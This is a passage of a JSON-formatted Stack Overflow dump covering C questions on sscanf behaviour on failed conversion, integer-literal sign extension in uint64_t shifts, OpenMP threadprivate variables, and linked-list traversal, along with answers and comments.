NULL) still stands."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1444832831, "post_id": 33127384, "comment_id": 54068165, "body": "Pretty sure that the answer is <b>Yes</b>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1444835050, "post_id": 33127384, "comment_id": 54069823, "body": "Detail: <a href=\"http://stackoverflow.com/questions/33113457/too-few-arguments-to-function-what-does-it-mean-where-do-i-go-wrong/33113646#comment54045220_33113646\">&quot;This question was raised in a comment &quot;</a> refereed to <code>scanf()</code>, not <code>sscanf()</code> as posted here."}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 2, "last_activity_date": 1444833408, "creation_date": 1444833408, "answer_id": 33128337, "question_id": 33127384, "link": "https://stackoverflow.com/questions/33127384/sscanf-unconverted-fields-are-unaffected/33128337#33128337", "title": "sscanf unconverted fields are unaffected?", "body": "<blockquote>\n  <p>If <code>sscanf</code> must convert a field, and it fails, will the field's corresponding variable remain unaffected?</p>\n</blockquote>\n\n<p>The standard does not say so explicitly, but it does seem to follow from the step-by-step description of the behavior of the <code>scanf()</code> family of functions.  In particular:</p>\n\n<blockquote>\n  <p>Except in the case of a <code>%</code> specifier, the input item [...] is converted to a type appropriate to the conversion specifier.  If the input item is not a matching sequence, the execution of the directive fails: this condition is a matching failure.  Unless assignment suppression was indicated by a <code>*</code>, the result of the conversion is placed in the object pointed to by the first argument following the <code>format</code> argument that has not already received a conversion result.</p>\n</blockquote>\n\n<p>I think it's pretty hard to interpret that other than as saying that first the input is converted, and then, if conversion is successful, it is assigned.  It follows that if conversion fails, the pointed-to object is not modified (by <em>that</em> conversion specifier -- it could have been modified by an earlier one if arguments are duplicated or if they alias each other).</p>\n\n<p>Thus, I think your code should be expected to behave as you anticipated.</p>\n"}], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "closed_date": 1444833744, "accepted_answer_id": 33128337, "answer_count": 1, "score": 2, "last_activity_date": 1444833408, "creation_date": 1444831097, "question_id": 33127384, "link": "https://stackoverflow.com/questions/33127384/sscanf-unconverted-fields-are-unaffected", "closed_reason": "Duplicate", "title": "sscanf unconverted fields are unaffected?", "body": "<p>If <code>sscanf</code> must convert a field, and it fails, will the field's corresponding variable remain unaffected? This question was raised in a comment in a recent solution I posted:</p>\n\n<pre><code>int validate(int low, int high) {\nint s=0;\nchar buf[128];\n\n    do {\n        if (fgets(buf,128,stdin)==0 || sscanf(buf, \"%d\", &amp;s)!=1 || (s&lt;low || s&gt;high))\n            printf(\"invalid Input, try again:\");\n    } while (s&lt;low || s&gt;high);\n    return s;\n}\n</code></pre>\n\n<p>In this example, <code>s</code> is intialized to zero and it is assumed it remains zero while <code>sscanf</code> cannot convert an integer value from the input. This ensuers the loop is not exited while invalid input has been entered (assuming <code>low</code> is larger than zero).</p>\n\n<p>From VC2008 documentation \"<em><code>sscanf</code>...returns the number of fields successfully converted and assigned</em>\" which seems to imply it internally converts the input and after successful conversion performs the assignment. That in turn would imply that <code>s</code> is unaffected if <code>sscanf</code> could not convert the input.</p>\n"}, {"tags": ["c", "literals", "signed", "integer-promotion", "uint64"], "comments": [{"owner": {"reputation": 1975, "user_id": 5392438, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/aa9081c7a8a8420b63267663f22f6010?s=128&d=identicon&r=PG&f=1", "display_name": "x13", "link": "https://stackoverflow.com/users/5392438/x13"}, "edited": false, "score": 0, "creation_date": 1444831349, "post_id": 33127326, "comment_id": 54067053, "body": "I heard once, somewhere, that casting int64&#39;s causes misbehavior in a small percentage of 32 bit scenarios. Unity is (or was?) known for this, this is the reason that Kerbal Space Program can&#39;t use more than 3.5Gb of RAM. It is also the reason i quit KSP."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 3, "creation_date": 1444832936, "post_id": 33127326, "comment_id": 54068249, "body": "Suffix your numeric constants with u or ul or ull: <code>0xffull</code> (constants have a type too, numeric constants have the type <i>signed</i> int by default, unless a decimal point is present, etc)"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "reply_to_user": {"reputation": 1975, "user_id": 5392438, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/aa9081c7a8a8420b63267663f22f6010?s=128&d=identicon&r=PG&f=1", "display_name": "x13", "link": "https://stackoverflow.com/users/5392438/x13"}, "edited": false, "score": 0, "creation_date": 1538107478, "post_id": 33127326, "comment_id": 92035524, "body": "@x13 it&#39;s unrelated here. The OP just didn&#39;t know about C&#39;s rule about promotion and type of integer literals. There&#39;s no hardware of compiler bug in the above code"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1554613865, "post_id": 33127326, "comment_id": 97812583, "body": "It is incorrect to use <code>llX</code> for printing <code>uint64_t</code>, you must use the <i>macro</i> <code>PRIX64</code>. Likewise for <code>uint32_t</code>"}], "answers": [{"comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1554614036, "post_id": 52548103, "comment_id": 97812615, "body": "<code>0xFF &lt;&lt; 24</code> results in <i>undefined behavior</i>"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1554622589, "post_id": 52548103, "comment_id": 97814057, "body": "@AnttiHaapala I knew that but I wanted to keep it short. I&#39;ve added the note now"}], "tags": [], "owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "is_accepted": false, "score": 3, "last_activity_date": 1603290018, "last_edit_date": 1603290018, "creation_date": 1538107342, "answer_id": 52548103, "question_id": 33127326, "link": "https://stackoverflow.com/questions/33127326/why-do-the-upper-32-bits-of-a-uint64-t-become-one-whilst-performing-a-specific-b/52548103#52548103", "title": "Why do the upper 32 bits of a uint64_t become one whilst performing a specific bitwise operation?", "body": "<p>By default integer literals without a suffix will have type <code>int</code> if they fit in an <code>int</code>.</p>\n<blockquote>\n<h1><a href=\"https://en.cppreference.com/w/c/language/integer_constant\" rel=\"nofollow noreferrer\">The type of the integer constant</a></h1>\n<p>The type of the integer constant is the first type in which the value can fit, from the list of types which depends on which numeric base and which <code>integer-suffix</code> was used.</p>\n<ul>\n<li>no suffix</li>\n<li>decimal bases:\n<ul>\n<li>int</li>\n<li>long int</li>\n<li>unsigned long int (until C99)</li>\n<li>long long int (since C99)</li>\n</ul>\n</li>\n<li>binary, octal, or hexadecimal bases:\n<ul>\n<li>int</li>\n<li>unsigned int</li>\n<li>long int</li>\n<li>unsigned long int</li>\n<li>long long int (since C99)</li>\n<li>unsigned long long int (since C99)</li>\n</ul>\n</li>\n<li>...</li>\n</ul>\n</blockquote>\n<p>As a result <code>0x00000000000000FF</code> will be an <code>int</code> regardless of how many zeros you put in. You can check that by printing <code>sizeof 0x00000000000000FF</code></p>\n<p>Therefore, <code>0x00000000000000FF &lt;&lt; 24</code> results in 0xFF000000 which is a negative value<sup>1</sup>. That'll again be sign extended when casting to <code>uint64_t</code>, filling the top 32 bits with ones</p>\n<p>Casting help, as you can see in <code>(uint64_t)0x00000000000000FF) &lt;&lt; 24</code>, because now the shift operates on the <code>uint64_t</code> value instead of <code>int</code>. You can also use a suffix</p>\n<pre><code>0x00000000000000FFU &lt;&lt; 24\n0x00000000000000FFULL &lt;&lt; 24\n</code></pre>\n<p>The first line above does the shift in <code>unsigned int</code> and then do zero extension to cast to <code>uint64_t</code>. The second one does the operation in <code>unsigned long long</code> directly</p>\n<p><code>0x000000FF &lt;&lt; 8</code> doesn't expose the same behavior because the result is 0xFF00 which doesn't have the sign bit set, but it will if you do <code>(int16_t)0x000000FF &lt;&lt; 8</code></p>\n<p>There are a lot of related and duplicate questions:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/q/8108642/995714\">Type of integer literals not int by default?</a></li>\n<li><a href=\"https://stackoverflow.com/q/41405578/995714\">What Are Integer Literal Type? And How They Are Stored?</a></li>\n<li><a href=\"https://stackoverflow.com/q/13134956/995714\">what is the reason for explicitly declaring L or UL for long values</a></li>\n<li>...</li>\n</ul>\n<hr />\n<p><sup>1</sup> Technically shifting into the sign bit results in undefined behavior but in your case the compiler has chosen to leave the result the same as when you shift an unsigned value: <code>0xFFU &lt;&lt; 24 = 0xFF000000U</code> which when converted to signed produces a negative value</p>\n<p>See</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/q/9290823/995714\">Bitwise shift operation in C on uint64_t variable</a></li>\n<li><a href=\"https://stackoverflow.com/q/46246411/995714\">Why does shifting 0xff left by 24 bits result in an incorrect value?</a></li>\n</ul>\n"}], "owner": {"reputation": 151, "user_id": 3223828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XO3IQ.jpg?s=128&g=1", "display_name": "Stuart Gillibrand", "link": "https://stackoverflow.com/users/3223828/stuart-gillibrand"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 228, "favorite_count": 1, "answer_count": 1, "score": 3, "last_activity_date": 1603290018, "creation_date": 1444830972, "last_edit_date": 1554611788, "question_id": 33127326, "link": "https://stackoverflow.com/questions/33127326/why-do-the-upper-32-bits-of-a-uint64-t-become-one-whilst-performing-a-specific-b", "title": "Why do the upper 32 bits of a uint64_t become one whilst performing a specific bitwise operation?", "body": "<p>Can someone please explain to me why the upper 32 bits of a <code>uint64_t</code> are set to one in case number #2:</p>\n\n<pre><code>uint64_t ret = 0;\nret = (((uint64_t)0x00000000000000FF) &lt;&lt; 24);\nprintf(\"#1 [%016llX]\\n\", ret);\n\nret = (0x00000000000000FF &lt;&lt; 24);\nprintf(\"#2 [%016llX]\\n\", ret);\n\nuint32_t ret2 = 0;\nret2 = (((uint32_t)0x000000FF) &lt;&lt; 8);\nprintf(\"#3 [%08X]\\n\", ret2);\n\nret2 = (0x000000FF &lt;&lt; 8);\nprintf(\"#4 [%08X]\\n\", ret2);\n</code></pre>\n\n<h2>Output:</h2>\n\n<pre><code>#1 [00000000FF000000]\n#2 [FFFFFFFFFF000000]\n#3 [0000FF00]\n#4 [0000FF00]\n</code></pre>\n\n<p><a href=\"https://ideone.com/xKUaTe\" rel=\"nofollow noreferrer\">https://ideone.com/xKUaTe</a></p>\n\n<p>You'll notice I've given an \"equivalent\" 32bit version (cases #3 and #4) which doesn't show the same behaviour...</p>\n"}, {"tags": ["c", "multithreading", "openmp"], "comments": [{"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1444830691, "post_id": 33127093, "comment_id": 54066588, "body": "Probably functions that you want to use in parallel code are performance sensitive? So you should never ever have them use global variables to be gin with. Pass them as parameters, this might even speed up your sequential code, because the compiler doesn&#39;t have to worry about aliasing. As a general rule, clean up your sequential code before you even attempt to parallelize it."}, {"owner": {"reputation": 259, "user_id": 2098936, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/VShwW.jpg?s=128&g=1", "display_name": "Kaur", "link": "https://stackoverflow.com/users/2098936/kaur"}, "reply_to_user": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1444830795, "post_id": 33127093, "comment_id": 54066670, "body": "Thanks Jens. I am calling these functions probably million times. Is it still efficient to pass the parameters everytime than to let them use it as global variables?"}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 2, "creation_date": 1444830943, "post_id": 33127093, "comment_id": 54066763, "body": "Yes, parameter passing isn&#39;t expensive, at least some parameters more or less don&#39;t make the difference. But optimization of your code can be much better afterwards."}, {"owner": {"reputation": 4037, "user_id": 4056099, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/xF37X.jpg?s=128&g=1", "display_name": "NoseKnowsAll", "link": "https://stackoverflow.com/users/4056099/noseknowsall"}, "reply_to_user": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1444832927, "post_id": 33127093, "comment_id": 54068243, "body": "An alternative that you can do is make <code>low</code> and <code>high</code> arrays of size <code>numberOfThreads</code>. Outside of your parallel section, every element of the arrays should be set to what your current single values are. Inside the loop, you can make them shared and each thread will only access its single element of the <code>low</code> and <code>high</code> shared array. In general though, I&#39;d suggest what @JensGustedt has suggested."}, {"owner": {"reputation": 4037, "user_id": 4056099, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/xF37X.jpg?s=128&g=1", "display_name": "NoseKnowsAll", "link": "https://stackoverflow.com/users/4056099/noseknowsall"}, "edited": false, "score": 0, "creation_date": 1444833081, "post_id": 33127093, "comment_id": 54068351, "body": "An important question to ask yourself is: do you care what <code>low</code> and <code>high</code> are at the end of the parallel section? Because right now, your parallel implementation will yield different results than your single thread implementation: each thread will be updating <code>low</code> and <code>high</code> separately. Perhaps you need a reduction clause on them?"}, {"owner": {"reputation": 259, "user_id": 2098936, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/VShwW.jpg?s=128&g=1", "display_name": "Kaur", "link": "https://stackoverflow.com/users/2098936/kaur"}, "edited": false, "score": 0, "creation_date": 1444865942, "post_id": 33127093, "comment_id": 54086342, "body": "Thanks. I don&#39;t need <code>low</code>,<code>high</code> after the parallel region. I will use them as parameters now. As the number of threads can be thousands and each <code>low&#39; </code>high` is a <code>unsigned long long</code> in real so an array of them will unnecessarily hold space I think."}, {"owner": {"reputation": 29002, "user_id": 2542702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/fW5ka.jpg?s=128&g=1", "display_name": "Z boson", "link": "https://stackoverflow.com/users/2542702/z-boson"}, "edited": false, "score": 0, "creation_date": 1444894361, "post_id": 33127093, "comment_id": 54095000, "body": "<code>low</code> and <code>high</code> in your code are not global their scope is local to <code>main</code>."}, {"owner": {"reputation": 29002, "user_id": 2542702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/fW5ka.jpg?s=128&g=1", "display_name": "Z boson", "link": "https://stackoverflow.com/users/2542702/z-boson"}, "edited": false, "score": 1, "creation_date": 1444894609, "post_id": 33127093, "comment_id": 54095153, "body": "I really don&#39;t understand what you&#39;re trying to do. It looks sorta like you want a reduction of some sort on <code>low</code> and <code>high</code> to use outside of the parallel region or in another parallel region later which you don&#39;t show. But then you say that you only need them in your parallel region in the comments. Why don&#39;t you show the scalar code of what you are trying to achieve?"}], "answers": [{"tags": [], "owner": {"reputation": 8381, "user_id": 5239503, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/MqgeX.jpg?s=128&g=1", "display_name": "Gilles", "link": "https://stackoverflow.com/users/5239503/gilles"}, "is_accepted": false, "score": 1, "last_activity_date": 1444898587, "creation_date": 1444898587, "answer_id": 33143796, "question_id": 33127093, "link": "https://stackoverflow.com/questions/33127093/how-can-threads-use-different-values-of-variables-with-global-scope-in-openmp/33143796#33143796", "title": "How can threads use different values of variables with global scope in OpenMP?", "body": "<p>Your code snippet is quite obscure but seem buggy. Let's assume you had the following in mind when you asked your question:</p>\n\n<pre><code>int low=5, high=10;\n#pragma omp threadprivate(low, high)\n\nfunc1(int *k) { do something with low,high and set value for k}\nfunc2(int *k) { do something with low,high and set value for k}\nfunc3(int *k) { do something with low,high and set value for k}\n\n[...]\n\nint main (void) {\n    [...]\n    int i;\n    int *arr= malloc(CONSTANT1*sizeof(int));\n    #pragma omp parallel num_threads(numberOfThreads) private(i)\n    {\n        #pragma omp for\n        for (i=0; i&lt;CONSTANT1; i++) {\n            low = low + CONSTANT2 * i;\n            high = low + CONSTANT2;\n            func1(&amp;arr[i]);\n            func2(&amp;arr[i]);\n            func3(&amp;arr[i]);\n            [...]\n        }\n    }\n}\n</code></pre>\n\n<p>Then, although the use of <code>threadprivate</code> makes the code valid, you have a problem here because of <code>low = low + CONSTANT2 * i;</code>. This line depends on the previous value of <code>low</code> and is therefore not suited for parallelisation since the order matters. However, if you change your code like this:</p>\n\n<pre><code>        int lowinit = low;\n        #pragma omp for\n        for (i=0; i&lt;CONSTANT1; i++) {\n            low = lowinit + CONSTANT2 * i*(i+1)/2;\n</code></pre>\n\n<p>Then your code becomes correct (provided your functions do not change <code>low</code> internally).</p>\n\n<p>In term of performance, I'm not sure the global versus parameter aspect of <code>high</code> and <code>low</code> will make much of a difference. However, it is clear to me that having them passed as parameters rather than global variable makes the code much cleaner and less error prone.</p>\n\n<p>Finally, if the values of <code>high</code> and <code>low</code> have any sort of importance upon exit of the parallel loop or region, be aware that this is the ones of the master thread that will be kept, which are likely to be different from the ones they would have had without OpenMP. In such case, you can add these lines to your code where necessary to ensure correctness:</p>\n\n<pre><code>        low = lowinit + CONSTANT2 * (CONSTANT1-1)*CONSTANT1/2;\n        high = low + CONSTANT2;\n</code></pre>\n"}], "owner": {"reputation": 259, "user_id": 2098936, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/VShwW.jpg?s=128&g=1", "display_name": "Kaur", "link": "https://stackoverflow.com/users/2098936/kaur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 761, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1444898587, "creation_date": 1444830308, "last_edit_date": 1444895071, "question_id": 33127093, "link": "https://stackoverflow.com/questions/33127093/how-can-threads-use-different-values-of-variables-with-global-scope-in-openmp", "title": "How can threads use different values of variables with global scope in OpenMP?", "body": "<p>I have few global variables which are being used by various functions in the <code>C</code> program. I am using <code>OpenMP</code> threads in parallel. Each thread will call these functions assigning different values to these global variables. Is there any other alternative to <code>threadprivate</code>? It's not clear to me how to use <code>copyin</code> clause.\nThe sample code is like this:</p>\n\n<pre><code>int main (void) {\n     int low=5,high=0;\n     ----\n     func1(int *k) { do something with low,high and set value for k}\n     func2(int *k) { do something with low,high and set value for k}\n     func3(int *k) { do something with low,high and set value for k}\n     ----\n     int i;\n     int *arr= malloc(CONSTANT1*sizeof(int));\n     #pragma omp parallel num_threads(numberOfThreads) threadprivate(low,high) private(i) shared(arr)\n     {\n     #pragma omp for\n     for(i=0;i&lt;CONSTANT1;i++) {\n         low=low+CONSTANT2*i;\n         high=low+CONSTANT2;\n         func1(&amp;arr[i]);\n         func2(&amp;arr[i]);\n         func3(&amp;arr[i]);\n         ----\n     }\n     }\n}\n</code></pre>\n\n<p>Or shall I use <code>private(low,high)</code> and pass them again and again to each function?\nPlease advise.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 1, "creation_date": 1444830485, "post_id": 33127075, "comment_id": 54066432, "body": "<code>while(temp-&gt;next!=current)</code> should be <code>while(temp &amp;&amp; temp-&gt;next!=current)</code>, otherwise you would dereference a NULL pointer, which is undefined behaviour."}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 1, "creation_date": 1444830678, "post_id": 33127075, "comment_id": 54066574, "body": "There isn&#39;t a really convenient way to traverse a singly linked list backward... you can use a double linked list instead, or reverse the list first and traverse the reversed list forward."}, {"owner": {"reputation": 55, "user_id": 3549842, "user_type": "registered", "accept_rate": 9, "profile_image": "https://www.gravatar.com/avatar/3c044464cf67a2c5d90e2a6fdc3a026b?s=128&d=identicon&r=PG&f=1", "display_name": "karabugra05", "link": "https://stackoverflow.com/users/3549842/karabugra05"}, "edited": false, "score": 0, "creation_date": 1444830906, "post_id": 33127075, "comment_id": 54066740, "body": "mch I tried your answer but it is not solved ,I dont want to reverse list  thank you for answers"}, {"owner": {"reputation": 1880, "user_id": 4281182, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/teZv4.png?s=128&g=1", "display_name": "Sel&#231;uk Cihan", "link": "https://stackoverflow.com/users/4281182/sel%c3%a7uk-cihan"}, "edited": false, "score": 0, "creation_date": 1444831445, "post_id": 33127075, "comment_id": 54067125, "body": "what is the point of having &#39;temp&#39; as a parameter?"}, {"owner": {"reputation": 55, "user_id": 3549842, "user_type": "registered", "accept_rate": 9, "profile_image": "https://www.gravatar.com/avatar/3c044464cf67a2c5d90e2a6fdc3a026b?s=128&d=identicon&r=PG&f=1", "display_name": "karabugra05", "link": "https://stackoverflow.com/users/3549842/karabugra05"}, "reply_to_user": {"reputation": 1880, "user_id": 4281182, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/teZv4.png?s=128&g=1", "display_name": "Sel&#231;uk Cihan", "link": "https://stackoverflow.com/users/4281182/sel%c3%a7uk-cihan"}, "edited": false, "score": 0, "creation_date": 1444832279, "post_id": 33127075, "comment_id": 54067748, "body": "I learned it new ,temp was not necessarily , thank yo @Sel&#231;ukCihan"}], "answers": [{"comments": [{"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 1, "creation_date": 1444831068, "post_id": 33127236, "comment_id": 54066857, "body": "@ameyCU It shouldn&#39;t be. Casting to <code>void</code> game me <a href=\"http://melpon.org/wandbox/permlink/sh88B0VLjn5jwXbV\" rel=\"nofollow noreferrer\">no errors nor warnings</a>, and casting to <code>void*</code> gave me <a href=\"http://melpon.org/wandbox/permlink/nBrMF9ayGbUDCjae\" rel=\"nofollow noreferrer\">a warning</a>."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444831328, "post_id": 33127236, "comment_id": 54067040, "body": "That is just a warning of unused variable. But I am surprised it didn&#39;t gave anything with <code>void</code> ."}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444831483, "post_id": 33127236, "comment_id": 54067159, "body": "@ameyCU Why the cast <b>should be</b> <code>void *</code> despite of the warning? Why do you <b>want</b> the warning?"}, {"owner": {"reputation": 55, "user_id": 3549842, "user_type": "registered", "accept_rate": 9, "profile_image": "https://www.gravatar.com/avatar/3c044464cf67a2c5d90e2a6fdc3a026b?s=128&d=identicon&r=PG&f=1", "display_name": "karabugra05", "link": "https://stackoverflow.com/users/3549842/karabugra05"}, "edited": false, "score": 0, "creation_date": 1444832054, "post_id": 33127236, "comment_id": 54067564, "body": "@MikeCAT i am grateful to you ,your codes worked a lot ,and thank you ameyCU"}], "tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": false, "score": 0, "last_activity_date": 1444830859, "last_edit_date": 1444830859, "creation_date": 1444830740, "answer_id": 33127236, "question_id": 33127075, "link": "https://stackoverflow.com/questions/33127075/traverse-pointer-from-last-node-to-first/33127236#33127236", "title": "traverse pointer from last node to first", "body": "<p><code>temp-&gt;next!=current</code> will never be true unless <code>temp==temp-&gt;next</code>.</p>\n\n<p>Try this:</p>\n\n<pre><code>bn_ptr drive_temp(bn_ptr head,bn_ptr temp,bn_ptr current)\n{\n\n    while(temp-&gt;next!=current)\n    {\n        temp=temp-&gt;next;\n    }\n    current=temp; /* get this out of the loop */\n    temp=head;\n\n    return current; \n}\n</code></pre>\n\n<p>or more simplified this:</p>\n\n<pre><code>bn_ptr drive_temp(bn_ptr head,bn_ptr temp,bn_ptr current)\n{\n    (void)head; /* head isn't used, so put this to avoid warning */\n    while(temp-&gt;next!=current)\n    {\n        temp=temp-&gt;next;\n    }\n    /* current and temp will be lost, so assigning to them here is useless */\n\n    return temp; \n}\n</code></pre>\n\n<p>To make it safer, make sure that <code>temp</code> isn't <code>NULL</code> to avoid runtime error in case of <code>current</code> is invalid.</p>\n\n<pre><code>bn_ptr drive_temp(bn_ptr head,bn_ptr temp,bn_ptr current)\n{\n    (void)head; /* head isn't used, so put this to avoid warning */\n    while(temp != NULL &amp;&amp; temp-&gt;next!=current)\n    {\n        temp=temp-&gt;next;\n    }\n\n    /* temp will be the previous node of current or NULL */\n    return temp; \n}\n</code></pre>\n\n<p>Maybe you want this:</p>\n\n<pre><code>bn_ptr drive_temp(bn_ptr head,bn_ptr current) /* remove temp from the arguments */\n{\n    bn_ptr temp = head;\n    while(temp != NULL &amp;&amp; temp-&gt;next!=current)\n    {\n        temp=temp-&gt;next;\n    }\n\n    /* temp will be the previous node of current or NULL */\n    return temp; \n}\n</code></pre>\n"}], "owner": {"reputation": 55, "user_id": 3549842, "user_type": "registered", "accept_rate": 9, "profile_image": "https://www.gravatar.com/avatar/3c044464cf67a2c5d90e2a6fdc3a026b?s=128&d=identicon&r=PG&f=1", "display_name": "karabugra05", "link": "https://stackoverflow.com/users/3549842/karabugra05"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 182, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1444830859, "creation_date": 1444830266, "question_id": 33127075, "link": "https://stackoverflow.com/questions/33127075/traverse-pointer-from-last-node-to-first", "title": "traverse pointer from last node to first", "body": "<pre><code>bn_ptr drive_temp(bn_ptr head,bn_ptr temp,bn_ptr current)\n{\n\n    